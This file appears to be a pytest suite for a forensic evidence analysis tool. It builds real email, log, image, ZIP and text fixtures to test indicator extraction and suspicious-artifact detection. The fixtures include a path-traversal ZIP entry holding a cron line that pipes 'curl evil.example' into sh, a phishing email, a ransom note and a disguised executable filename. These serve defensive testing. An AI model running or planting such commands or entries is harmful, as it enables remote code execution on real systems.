"""Analyzer tests against real generated artifacts.

Every fixture here is a genuine file of its format - a real RFC 5322 message with a real Received
chain, a real JPEG carrying real EXIF GPS rationals, a real ZIP - built in the test rather than
mocked. Analyzers exist to extract facts from real byte layouts, so a mocked parser would confirm
only that the test author and the implementation share the same misunderstanding.

These tests need no database. That is a direct consequence of analyzers receiving an
``ArtifactHandle`` instead of an ORM row, and it is what makes this the fastest and most detailed
suite in the project.
"""

from __future__ import annotations

import io
import zipfile
from datetime import UTC, datetime

import pytest

from app.analysis import registry
from app.analysis.base import ArtifactHandle
from app.forensics.hashing import hash_bytes
from app.models.enums import EntityType, EvidenceType, ObservationKind, Severity


def handle(
    content: bytes,
    *,
    filename: str,
    mime_type: str,
    evidence_type: EvidenceType = EvidenceType.other,
    acquired_at: datetime | None = None,
) -> ArtifactHandle:
    """Build an ArtifactHandle over in-memory bytes, mirroring what the pipeline constructs."""

    def open_stream() -> object:
        return iter([content[index : index + 65536] for index in range(0, len(content), 65536)])

    return ArtifactHandle(
        evidence_id="test-evidence",
        case_id="test-case",
        filename=filename,
        mime_type=mime_type,
        evidence_type=evidence_type,
        size_bytes=len(content),
        sha256=hash_bytes(content).sha256,
        open_stream=open_stream,
        head=content[:8192],
        acquired_at=acquired_at,
    )


def find(output: object, code: str) -> object | None:
    return next((f for f in output.findings if f.code == code), None)  # type: ignore[attr-defined]


def values(output: object, entity_type: EntityType) -> set[str]:
    return {  # type: ignore[attr-defined]
        entity.value.lower() for entity in output.entities if entity.type is entity_type
    }


# ======================================================================================
# Indicator extraction - the precision of this determines the quality of everything built
# on top of it, so the negative cases matter as much as the positive ones.
# ======================================================================================


class TestIndicatorExtraction:
    def test_extracts_valid_addresses_and_rejects_impostors(self) -> None:
        from app.analysis import indicators

        text = (
            "Connection from 203.0.113.45 to 10.0.0.7 established.\n"
            "Version 1.2.3.4.5 of the agent reported code 999.888.777.666.\n"
            "Loopback check on 127.0.0.1 passed."
        )
        found = {entity.value for entity in indicators.extract(text)}

        assert "203.0.113.45" in found
        assert "10.0.0.7" in found
        assert "127.0.0.1" in found
        # Five octets is not an address, and no octet may exceed 255. Both are rejected by
        # validation rather than by the regex, which is why they are worth asserting.
        assert "1.2.3.4.5" not in found
        assert "999.888.777.666" not in found

    def test_private_and_public_addresses_are_labelled_differently(self) -> None:
        from app.analysis import indicators

        extracted = indicators.extract(
            "external 198.51.100.9 routable 8.8.4.4 internal 192.168.1.10 local 127.0.0.1"
        )
        contexts = {entity.value: entity.context for entity in extracted}

        assert contexts["8.8.4.4"] == "public"
        assert contexts["192.168.1.10"] == "private"
        assert contexts["127.0.0.1"] == "loopback"
        # RFC 5737 documentation ranges are what test data and examples use. Python reports them
        # as private, so they must be classified explicitly or every example address in the
        # system would be mistaken for a host on the subject's own network.
        assert contexts["198.51.100.9"] == "documentation"
        assert indicators.is_external_address("198.51.100.9") is True
        assert indicators.is_external_address("192.168.1.10") is False

    def test_filenames_are_not_mistaken_for_domains(self) -> None:
        from app.analysis import indicators

        text = (
            "Opened report.pdf and archive.zip, parsed schema.xsd, ran build.sh. "
            "Contacted payments.example-vendor.net for settlement."
        )
        domains = {
            entity.value
            for entity in indicators.extract(text)
            if entity.type is EntityType.domain
        }

        assert "payments.example-vendor.net" in domains
        for filename in ("report.pdf", "archive.zip", "schema.xsd", "build.sh"):
            assert filename not in domains

    def test_repeated_values_collapse_into_one_counted_occurrence(self) -> None:
        from app.analysis import indicators

        text = "\n".join(f"attempt {index} from 203.0.113.9" for index in range(50))
        addresses = [
            entity
            for entity in indicators.extract(text)
            if entity.type is EntityType.ip_address
        ]

        assert len(addresses) == 1
        assert addresses[0].occurrence_count == 50
        # The first sighting is the one kept, because that is where an analyst starts reading.
        assert addresses[0].locator["line"] == 1

    def test_every_extraction_carries_a_locator(self) -> None:
        from app.analysis import indicators

        extracted = indicators.extract(
            "line one\nmail suspect@evil.example.net here\nline three"
        )
        assert extracted
        for entity in extracted:
            assert entity.locator, f"{entity.value} was recorded with no locator"
            assert "char_offset" in entity.locator
            assert entity.excerpt


# ======================================================================================
# Universal file analyzer
# ======================================================================================


class TestFileMetadataAnalyzer:
    def test_reports_hashes_and_size_for_any_artifact(self) -> None:
        content = b"forensic sample content" * 100
        output = registry.get("file_metadata").analyze(
            handle(content, filename="sample.bin", mime_type="application/octet-stream")
        )

        expected = hash_bytes(content)
        assert output.metadata["hashes"]["sha256"] == expected.sha256
        assert output.metadata["hashes"]["md5"] == expected.md5
        assert output.metadata["size_bytes"] == len(content)
        assert output.bytes_examined == len(content)
        assert expected.sha256 in values(output, EntityType.file_hash)

    def test_flags_executable_disguised_as_document(self) -> None:
        # A real PE header. The extension claims PDF, the content says otherwise.
        content = b"MZ\x90\x00\x03" + b"\x00" * 100 + b"This program cannot be run in DOS mode"
        output = registry.get("file_metadata").analyze(
            handle(content, filename="invoice_2024.pdf", mime_type="application/x-dosexec")
        )

        finding = find(output, "file.mime_extension_mismatch")
        assert finding is not None
        # Executable content behind a document extension is the serious case and must outrank a
        # merely mislabelled spreadsheet.
        assert finding.severity is Severity.high
        assert finding.attributes["declared_extension"] == ".pdf"

    def test_high_entropy_is_not_flagged_when_the_file_type_explains_it(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("payload.bin", bytes(range(256)) * 200)
        content = buffer.getvalue()

        output = registry.get("file_metadata").analyze(
            handle(content, filename="archive.zip", mime_type="application/zip")
        )

        assert output.metadata["expected_high_entropy"] is True
        assert find(output, "file.entropy_anomaly") is None

    def test_detects_data_appended_after_end_of_png(self) -> None:
        png = (
            b"\x89PNG\r\n\x1a\n"
            b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00"
            b"\x1f\x15\xc4\x89"
            b"\x00\x00\x00\x00IEND\xae B`\x82"
        )
        smuggled = png + b"BEGIN-HIDDEN-PAYLOAD" + bytes(range(256))

        output = registry.get("file_metadata").analyze(
            handle(smuggled, filename="photo.png", mime_type="image/png")
        )

        finding = find(output, "file.trailing_data")
        assert finding is not None
        assert finding.attributes["trailing_bytes"] > 0


# ======================================================================================
# Email analyzer - the delivery path and authentication logic carry the most weight
# ======================================================================================


PHISHING_EMAIL = b"""Received: from mail.corp-internal.example
\t(mail.corp-internal.example [198.51.100.20])
\tby mx.victim.example (Postfix) with ESMTPS id 4A2B3C4D5E
\tfor <finance@victim.example>; Mon, 15 Jan 2024 10:35:12 +0000
Received: from unknown-host.example (attacker-vps.example [203.0.113.66])
\tby mail.corp-internal.example (Postfix) with ESMTP id 1F2E3D4C
\tfor <finance@victim.example>; Mon, 15 Jan 2024 10:30:00 +0000
Authentication-Results: mx.victim.example;
\tspf=fail (sender IP is 203.0.113.66) smtp.mailfrom=vendor-invoices.example;
\tdkim=none header.d=none; dmarc=fail action=quarantine
From: "Accounts Payable" <billing@trusted-vendor.example>
Reply-To: <recovery.payments@vendor-invoices.example>
Return-Path: <bounce@attacker-infra.example>
To: finance@victim.example
Subject: URGENT: Updated bank details for invoice INV-88421
Date: Mon, 15 Jan 2024 10:29:45 +0000
Message-ID: <a1b2c3d4@vendor-invoices.example>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Please update our remittance account before processing invoice INV-88421.
Wire confirmation to 203.0.113.66 or contact us at +1 555 0100 4422.
Payment reference wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
"""


class TestEmailAnalyzer:
    @pytest.fixture
    def output(self) -> object:
        return registry.get("email_headers").analyze(
            handle(
                PHISHING_EMAIL,
                filename="suspicious.eml",
                mime_type="message/rfc822",
                evidence_type=EvidenceType.email_message,
            )
        )

    def test_reconstructs_delivery_path_in_chronological_order(self, output: object) -> None:
        path = output.metadata["delivery_path"]
        assert len(path) == 2
        # Relays prepend their header, so the file's *last* Received is the earliest hop. Getting
        # this backwards would invert the delivery path while still looking plausible.
        assert path[0]["from_ip"] == "203.0.113.66"
        assert path[0]["by"] == "mail.corp-internal.example"
        assert path[1]["by"] == "mx.victim.example"
        assert path[0]["timestamp"] < path[1]["timestamp"]

    def test_identifies_originating_address_distinctly_from_relays(self, output: object) -> None:
        contexts: dict[str, set[str]] = {}
        for entity in output.entities:
            if entity.type is EntityType.ip_address:
                contexts.setdefault(entity.value, set()).add(entity.context or "")

        # The originating relay is the address that matters for attribution, and it must be
        # labelled as such rather than lumped in with the downstream hops.
        assert "originating_ip" in contexts["203.0.113.66"]
        assert "relay_ip" in contexts["198.51.100.20"]
        # The same address also appears in the message body, and both sightings are kept: an
        # address quoted in the text is a separate observation from one in a Received header.
        assert any(context.startswith("body:") for context in contexts["203.0.113.66"])

    def test_reads_authentication_verdicts_from_delivery_headers(self, output: object) -> None:
        auth = output.metadata["authentication"]
        assert auth["spf"] == "fail"
        assert auth["dmarc"] == "fail"

        finding = find(output, "email.authentication_failed")
        assert finding is not None
        assert finding.severity is Severity.high
        # The verdict must be presented as the receiving server's conclusion, since SPF cannot be
        # meaningfully recomputed after the fact.
        assert "not recomputed" in finding.description

    def test_flags_reply_to_pointing_at_a_different_domain(self, output: object) -> None:
        finding = find(output, "email.reply_to_mismatch")
        assert finding is not None
        assert finding.attributes["from_domain"] == "trusted-vendor.example"
        assert finding.attributes["reply_to_domain"] == "vendor-invoices.example"

    def test_extracts_body_indicators_with_roles(self, output: object) -> None:
        assert "billing@trusted-vendor.example" in values(output, EntityType.email_address)
        assert "1a1zp1ep5qgefi2dmptftl5slmv7divfna" in values(output, EntityType.crypto_wallet)

        roles = {
            entity.value: entity.context
            for entity in output.entities
            if entity.type is EntityType.email_address
        }
        assert roles["billing@trusted-vendor.example"] == "sender"
        assert roles["finance@victim.example"] == "recipient"

    def test_produces_observations_for_send_and_each_relay_hop(self, output: object) -> None:
        kinds = [observation.kind for observation in output.observations]
        assert ObservationKind.email_sent in kinds
        assert kinds.count(ObservationKind.email_received) == 2

        sent = next(o for o in output.observations if o.kind is ObservationKind.email_sent)
        # The Date header is sender-controlled, and the observation must say so rather than
        # presenting it as established fact.
        assert "sender-supplied" in sent.attributes["source"]

    def test_detects_bidi_override_in_attachment_filename(self) -> None:
        message = (
            b"From: attacker@evil.example\r\n"
            b"To: victim@corp.example\r\n"
            b"Subject: Statement\r\n"
            b"Date: Mon, 15 Jan 2024 10:00:00 +0000\r\n"
            b'Content-Type: multipart/mixed; boundary="BOUND"\r\n\r\n'
            b"--BOUND\r\nContent-Type: text/plain\r\n\r\nSee attached.\r\n"
            b"--BOUND\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"Content-Disposition: attachment;\r\n"
            b'\tfilename="statement\xe2\x80\xaefdp.exe"\r\n\r\n'
            b"payload\r\n--BOUND--\r\n"
        )
        output = registry.get("email_headers").analyze(
            handle(message, filename="rtlo.eml", mime_type="message/rfc822")
        )

        finding = find(output, "email.filename_bidi_override")
        assert finding is not None
        assert finding.severity is Severity.critical

    def test_flags_date_header_contradicting_the_delivery_path(self) -> None:
        message = PHISHING_EMAIL.replace(
            b"Date: Mon, 15 Jan 2024 10:29:45 +0000",
            b"Date: Fri, 01 Mar 2024 08:00:00 +0000",
        )
        output = registry.get("email_headers").analyze(
            handle(message, filename="skewed.eml", mime_type="message/rfc822")
        )

        finding = find(output, "email.date_header_implausible")
        assert finding is not None
        assert finding.attributes["skew_seconds"] < 0


# ======================================================================================
# Log analyzer
# ======================================================================================


AUTH_LOG = "\n".join(
    [
        *[
            f"Jan 15 09:{minute:02d}:{second:02d} web01 sshd[{1000 + minute}]: "
            f"Failed password for invalid user admin from 203.0.113.99 port 4{minute:02d} ssh2"
            for minute, second in zip(range(10, 22), range(5, 60, 4), strict=False)
        ],
        "Jan 15 09:23:11 web01 sshd[1204]: Accepted password for deploy from 203.0.113.99 "
        "port 42311 ssh2",
        "Jan 15 09:24:02 web01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; "
        "COMMAND=/usr/bin/tar -czf /tmp/customer_db.tar.gz /var/lib/app/data",
        "Jan 15 09:25:44 web01 sshd[1210]: Accepted publickey for backup from 10.0.0.15 "
        "port 51022 ssh2",
    ]
)


class TestLogAnalyzer:
    @pytest.fixture
    def output(self) -> object:
        return registry.get("log_events").analyze(
            handle(
                AUTH_LOG.encode(),
                filename="auth.log",
                mime_type="text/plain",
                evidence_type=EvidenceType.system_log,
                acquired_at=datetime(2024, 3, 1, tzinfo=UTC),
            )
        )

    def test_anchors_yearless_syslog_dates_to_the_acquisition_year(self, output: object) -> None:
        # Syslog carries no year. Anchoring to acquisition keeps an old log in its own year rather
        # than relocating it to whenever the analysis happens to run.
        assert output.metadata["syslog_year_assumed"] == 2024
        assert output.metadata["year_anchor_source"] == "evidence acquisition time"
        assert output.metadata["time_range"]["earliest"].startswith("2024-01-15")

    def test_marks_syslog_timestamps_as_zone_assumed(self, output: object) -> None:
        assert output.observations
        for observation in output.observations:
            assert observation.timezone_assumed is True
            assert "no UTC offset" in observation.attributes["time_note"]

    def test_detects_credential_attack_that_succeeded(self, output: object) -> None:
        finding = find(output, "log.credential_attack")
        assert finding is not None
        # Failures followed by a success from the same address is the pattern that must escalate
        # above a plain brute-force burst.
        assert finding.severity is Severity.critical
        assert finding.attributes["subsequent_success"] is True
        assert finding.attributes["source_ip"] == "203.0.113.99"
        assert finding.attributes["failure_count"] == 12
        # The threshold and method must be recorded, or the score cannot be defended later.
        assert "threshold" in finding.attributes
        assert "method" in finding.attributes

    def test_collapses_repeated_failures_into_one_counted_observation(
        self, output: object
    ) -> None:
        failures = [
            observation
            for observation in output.observations
            if observation.kind is ObservationKind.login_failure
        ]
        assert len(failures) == 1
        assert failures[0].attributes["occurrence_count"] == 12
        assert "\u00d712" in failures[0].summary

    def test_extracts_usernames_and_addresses_as_entities(self, output: object) -> None:
        assert {"admin", "deploy", "backup"} <= values(output, EntityType.username)
        assert "203.0.113.99" in values(output, EntityType.ip_address)

    def test_recognises_privileged_command_execution(self, output: object) -> None:
        escalations = [
            observation
            for observation in output.observations
            if observation.kind is ObservationKind.privilege_change
        ]
        assert escalations
        assert "tar" in escalations[0].target_value

    def test_parses_combined_access_logs_and_flags_enumeration(self) -> None:
        lines = [
            f'203.0.113.77 - - [15/Jan/2024:11:{index % 60:02d}:00 +0000] '
            f'"GET /admin/{index}.php HTTP/1.1" 404 209 "-" "sqlmap/1.7"'
            for index in range(80)
        ]
        lines.append(
            '198.51.100.5 - - [15/Jan/2024:11:59:00 +0000] "GET /index.html HTTP/1.1" 200 5120 '
            '"-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
        )
        output = registry.get("log_events").analyze(
            handle(
                "\n".join(lines).encode(),
                filename="access.log",
                mime_type="text/plain",
                evidence_type=EvidenceType.system_log,
            )
        )

        assert output.metadata["formats"]["clf"] == 81
        finding = find(output, "log.enumeration_pattern")
        assert finding is not None
        assert finding.attributes["not_found"] == 80

    def test_iso_timestamps_with_offsets_are_not_marked_assumed(self) -> None:
        content = "\n".join(
            f"2024-01-15T10:{minute:02d}:00+05:30 service INFO request completed"
            for minute in range(5, 40)
        ).encode()
        output = registry.get("log_events").analyze(
            handle(
                content,
                filename="app.log",
                mime_type="text/plain",
                evidence_type=EvidenceType.system_log,
            )
        )

        assert output.observations
        assert all(not o.timezone_assumed for o in output.observations)


# ======================================================================================
# Image analyzer - GPS conversion is the part most easily got wrong
# ======================================================================================


def jpeg_with_exif() -> bytes:
    """Build a real JPEG carrying real EXIF GPS rationals via Pillow."""
    from PIL import Image

    image = Image.new("RGB", (64, 48), color=(20, 40, 60))
    exif = image.getexif()
    exif[0x010F] = "TestCam"  # Make
    exif[0x0110] = "Model X200"  # Model
    exif[0x0131] = "Adobe Photoshop 25.0 (Windows)"  # Software
    exif[0x0132] = "2024:01:15 09:00:00"  # DateTime
    exif[0x9003] = "2024:01:15 14:30:00"  # DateTimeOriginal
    exif[0xA431] = "SN-CAM-99871"  # BodySerialNumber

    from PIL.TiffImagePlugin import IFDRational

    gps = exif.get_ifd(0x8825)
    # Southern and western hemispheres, so a dropped reference letter shows up as a sign error.
    gps[1] = "S"
    gps[2] = (IFDRational(33, 1), IFDRational(52, 1), IFDRational(2760, 100))
    gps[3] = "W"
    gps[4] = (IFDRational(151, 1), IFDRational(12, 1), IFDRational(3600, 100))
    gps[5] = 0
    gps[6] = IFDRational(4520, 100)
    gps[29] = "2024:01:15"
    gps[7] = (IFDRational(14, 1), IFDRational(30, 1), IFDRational(5, 1))

    buffer = io.BytesIO()
    image.save(buffer, format="JPEG", exif=exif)
    return buffer.getvalue()


class TestImageAnalyzer:
    @pytest.fixture
    def output(self) -> object:
        return registry.get("image_exif").analyze(
            handle(
                jpeg_with_exif(),
                filename="evidence_photo.jpg",
                mime_type="image/jpeg",
                evidence_type=EvidenceType.image,
            )
        )

    def test_converts_gps_rationals_applying_hemisphere_references(self, output: object) -> None:
        gps = output.metadata["gps"]
        # 33 + 52/60 + 27.6/3600 = 33.874333, negated for S. 151 + 12/60 + 36/3600 = 151.21, for W.
        assert gps["latitude"] == pytest.approx(-33.874333, abs=1e-5)
        assert gps["longitude"] == pytest.approx(-151.21, abs=1e-4)
        assert gps["altitude_m"] == pytest.approx(45.2, abs=0.01)

    def test_records_location_as_a_correlatable_entity(self, output: object) -> None:
        locations = values(output, EntityType.location)
        assert any(value.startswith("-33.8743") for value in locations)

    def test_prefers_gps_satellite_time_over_camera_clock(self, output: object) -> None:
        geo = next(
            o for o in output.observations if o.kind is ObservationKind.geolocation
        )
        # The GPS clock comes from the satellites and is genuinely UTC, unlike the EXIF DateTime
        # fields which have no zone at all.
        assert geo.attributes["time_source"].startswith("GPS satellite clock")
        assert geo.timezone_assumed is False

    def test_camera_serial_is_recorded_as_a_device_identifier(self, output: object) -> None:
        assert "sn-cam-99871" in values(output, EntityType.device_identifier)
        assert "testcam model x200" in values(output, EntityType.device)

    def test_reports_editing_software(self, output: object) -> None:
        finding = find(output, "image.edited_by_software")
        assert finding is not None
        assert finding.attributes["matched_editor"] == "photoshop"
        # Editing is routine and must not be presented as evidence of wrongdoing.
        assert "routine" in finding.description

    def test_flags_modification_earlier_than_capture(self, output: object) -> None:
        finding = find(output, "image.timestamp_inconsistency")
        assert finding is not None
        assert finding.attributes["drift_seconds"] < 0

    def test_absent_metadata_is_reported_without_implying_tampering(self) -> None:
        from PIL import Image

        buffer = io.BytesIO()
        Image.new("RGB", (16, 16), color="white").save(buffer, format="PNG")

        output = registry.get("image_exif").analyze(
            handle(buffer.getvalue(), filename="clean.png", mime_type="image/png")
        )

        finding = find(output, "image.no_exif")
        assert finding is not None
        assert finding.severity is Severity.informational
        assert "not by itself an indication" in finding.description

    def test_malformed_image_is_skipped_with_a_reason(self) -> None:
        output = registry.get("image_exif").analyze(
            handle(b"\xff\xd8\xff\xe0" + b"garbage" * 50, filename="broken.jpg",
                   mime_type="image/jpeg")
        )
        assert output.skip_reason is not None
        assert output.findings == []


# ======================================================================================
# Archive analyzer - must never extract
# ======================================================================================


class TestArchiveAnalyzer:
    def test_lists_entries_without_extracting(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("docs/notes.txt", "meeting notes")
            archive.writestr("tools/harvest.exe", b"MZ\x90\x00" + b"\x00" * 500)

        output = registry.get("archive_inventory").analyze(
            handle(buffer.getvalue(), filename="bundle.zip", mime_type="application/zip",
                   evidence_type=EvidenceType.archive)
        )

        assert output.metadata["entry_count"] == 2
        assert "nothing was extracted" in output.metadata["note"]
        assert "harvest.exe" in values(output, EntityType.file_name)

        finding = find(output, "archive.executable_content")
        assert finding is not None
        assert finding.severity is Severity.high

    def test_detects_decompression_bomb_from_metadata_alone(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            # 100 MiB of zeroes compresses to a few KiB: the classic bomb shape.
            archive.writestr("bomb.dat", b"\x00" * (100 * 1024 * 1024))

        output = registry.get("archive_inventory").analyze(
            handle(buffer.getvalue(), filename="bomb.zip", mime_type="application/zip",
                   evidence_type=EvidenceType.archive)
        )

        finding = find(output, "archive.decompression_bomb")
        assert finding is not None
        assert finding.attributes["ratio"] > 200
        assert "nothing was extracted" in finding.description

    def test_detects_path_traversal_entries(self) -> None:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("../../etc/cron.d/backdoor", "* * * * * root curl evil.example|sh")
            archive.writestr("readme.txt", "hello")

        output = registry.get("archive_inventory").analyze(
            handle(buffer.getvalue(), filename="traversal.zip", mime_type="application/zip",
                   evidence_type=EvidenceType.archive)
        )

        finding = find(output, "archive.path_traversal")
        assert finding is not None
        assert finding.attributes["count"] == 1


# ======================================================================================
# Text analyzer
# ======================================================================================


class TestTextAnalyzer:
    def test_detects_ransom_note_by_language_plus_payment_address(self) -> None:
        note = (
            "ALL YOUR FILES HAVE BEEN ENCRYPTED.\n\n"
            "To obtain the decryption key you must pay within 72 hours.\n"
            "Send 2.5 bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
            "Contact us via tor browser at http://ransomsupport.onion/chat\n"
            "After the deadline we will publish your data.\n"
        )
        output = registry.get("text_content").analyze(
            handle(note.encode(), filename="README_RECOVER.txt", mime_type="text/plain")
        )

        finding = find(output, "text.extortion_language")
        assert finding is not None
        assert finding.severity is Severity.high
        assert "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" in finding.attributes["wallet_addresses"]

    def test_incident_discussion_without_payment_address_is_not_escalated(self) -> None:
        text = (
            "During the tabletop exercise we discussed how ransom demands typically "
            "reference bitcoin and set a deadline for the decryption key."
        )
        output = registry.get("text_content").analyze(
            handle(text.encode(), filename="exercise_notes.txt", mime_type="text/plain")
        )

        finding = find(output, "text.extortion_language")
        # Four distinct terms and no payment address, below the five-term bar that applies without
        # one. "decrypt" must not be counted separately from "decryption key", or a single phrase
        # would push training notes over the threshold on its own.
        assert finding is None

    def test_credential_findings_withhold_the_secret_values(self) -> None:
        content = (
            "db_host=10.0.0.5\n"
            "password=SuperSecret123!\n"
            "aws_key=AKIAIOSFODNN7EXAMPLE\n"
            "api_token=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n"
        )
        output = registry.get("text_content").analyze(
            handle(content.encode(), filename="config.env", mime_type="text/plain")
        )

        finding = find(output, "text.exposed_credentials")
        assert finding is not None
        # Copying live secrets into findings would propagate the exposure into reports and exports.
        assert finding.excerpt is None
        assert "SuperSecret123!" not in str(finding.attributes)
        assert finding.attributes["match_count"] >= 3

    def test_profiles_csv_columns_and_builds_timeline_rows(self) -> None:
        csv_content = (
            "timestamp,source_ip,dest_ip,bytes,amount\n"
            "2024-01-15T10:00:00,203.0.113.5,10.0.0.9,4096,150.00\n"
            "2024-01-15T10:05:00,203.0.113.5,10.0.0.9,8192,275.50\n"
            "2024-01-15T10:10:00,198.51.100.7,10.0.0.9,2048,99.99\n"
            "2024-01-15T10:15:00,198.51.100.7,10.0.0.9,1024,42.00\n"
        )
        output = registry.get("text_content").analyze(
            handle(csv_content.encode(), filename="netflow.csv", mime_type="text/csv",
                   evidence_type=EvidenceType.database_export)
        )

        structure = output.metadata["csv"]
        assert structure is not None
        assert structure["has_header"] is True
        assert structure["row_count"] == 4

        by_name = {column["name"]: column for column in structure["columns"]}
        assert by_name["source_ip"]["inferred_type"] == "ip_address"
        assert by_name["amount"]["inferred_type"] == "number"
        assert structure["timestamp_column"] == 0

        assert len(output.observations) == 4
        assert output.observations[0].source_value == "203.0.113.5"

    def test_prose_containing_commas_is_not_treated_as_tabular(self) -> None:
        prose = (
            "The suspect, who was interviewed on Tuesday, denied any involvement. "
            "He stated that he had, at no point, accessed the server."
        )
        output = registry.get("text_content").analyze(
            handle(prose.encode(), filename="statement.txt", mime_type="text/plain")
        )
        assert output.metadata["csv"] is None


# ======================================================================================
# Applicability - the wrong analyzer running is as much a defect as the right one failing
# ======================================================================================


class TestApplicability:
    def test_universal_analyzer_runs_for_every_artifact(self) -> None:
        for filename, mime, kind in (
            ("a.eml", "message/rfc822", EvidenceType.email_message),
            ("b.jpg", "image/jpeg", EvidenceType.image),
            ("c.zip", "application/zip", EvidenceType.archive),
            ("d.bin", "application/octet-stream", EvidenceType.other),
        ):
            selected = {
                analyzer.name
                for analyzer in registry.applicable(
                    handle(b"x" * 64, filename=filename, mime_type=mime, evidence_type=kind)
                )
            }
            assert "file_metadata" in selected

    def test_format_analyzers_do_not_run_on_unrelated_types(self) -> None:
        selected = {
            analyzer.name
            for analyzer in registry.applicable(
                handle(
                    b"\x89PNG\r\n\x1a\n" + b"\x00" * 64,
                    filename="photo.png",
                    mime_type="image/png",
                    evidence_type=EvidenceType.image,
                )
            )
        }
        assert "image_exif" in selected
        assert "email_headers" not in selected
        assert "log_events" not in selected
        assert "pdf_document" not in selected

    def test_plain_text_only_gets_the_log_analyzer_when_it_looks_like_a_log(self) -> None:
        prose = handle(
            b"Dear Sir, please find the attached statement for review. Regards, Accounts.",
            filename="letter.txt",
            mime_type="text/plain",
            evidence_type=EvidenceType.document,
        )
        assert "log_events" not in {a.name for a in registry.applicable(prose)}

        logline = handle(
            b"2024-01-15T10:00:00Z service INFO started\n" * 5,
            filename="service.txt",
            mime_type="text/plain",
            evidence_type=EvidenceType.document,
        )
        assert "log_events" in {a.name for a in registry.applicable(logline)}

    def test_oversized_artifacts_are_excluded_by_size_limit(self) -> None:
        artifact = ArtifactHandle(
            evidence_id="e",
            case_id="c",
            filename="huge.eml",
            mime_type="message/rfc822",
            evidence_type=EvidenceType.email_message,
            size_bytes=200 * 1024 * 1024,
            sha256="0" * 64,
            open_stream=lambda: iter([]),
            head=b"",
        )
        assert "email_headers" not in {a.name for a in registry.applicable(artifact)}


class TestAnalyzerContract:
    def test_every_finding_and_entity_carries_provenance(self) -> None:
        """No analyzer may record a claim it cannot point back at a location in the artifact."""
        artifacts = [
            handle(PHISHING_EMAIL, filename="m.eml", mime_type="message/rfc822",
                   evidence_type=EvidenceType.email_message),
            handle(jpeg_with_exif(), filename="p.jpg", mime_type="image/jpeg",
                   evidence_type=EvidenceType.image),
            handle(AUTH_LOG.encode(), filename="auth.log", mime_type="text/plain",
                   evidence_type=EvidenceType.system_log),
        ]
        for artifact in artifacts:
            for analyzer in registry.applicable(artifact):
                output = analyzer.analyze(artifact)
                for entity in output.entities:
                    assert entity.locator, f"{analyzer.name}: entity {entity.value} has no locator"
                for finding in output.findings:
                    label = f"{analyzer.name}: finding {finding.code}"
                    assert finding.locator, f"{label} has no locator"
                    assert finding.description, f"{label} has no description"
                for observation in output.observations:
                    assert observation.locator
                    assert observation.occurred_at.tzinfo is not None, (
                        f"{analyzer.name}: naive datetime would corrupt the timeline"
                    )
